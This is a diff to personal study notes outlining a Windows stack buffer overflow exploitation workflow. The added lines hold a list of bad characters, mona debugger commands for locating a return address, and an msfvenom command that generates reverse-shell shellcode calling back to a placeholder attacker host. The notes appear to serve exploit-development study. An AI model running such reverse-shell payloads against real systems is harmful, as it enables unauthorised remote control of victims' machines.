@@ -26,7 +26,9 @@ exploit
 1. fill the buffer
 2. fill the EIP
 3. checking for bad characters
-	removing bad characters: bad character makes ESP dump part suddenly stopped with filled with null byte
+	removing bad characters
+	 : bad character makes ESP dump part suddenly stopped with filled with null byte
+		\x00\x0a\x0d\x25\x26\x2b\x3d
 4. redirecting the execution flow
 	now, the hard coded address doesn't work. So go to next.
 5. finding a return address
@@ -36,6 +38,9 @@ exploit
 	<debugger command>
 		!mona modules : module list with address
 		!mona find -s "<hex code>" -m "<module name>"
-6. generating shellcode with metasploit - to do
+6. generating shellcode with metasploit
+	msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=<listening port> -f <format> -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 7. getting a shell
+	add GetPC routine
+	  : add NOPs that means just passing to next command
 8. improving the exploit
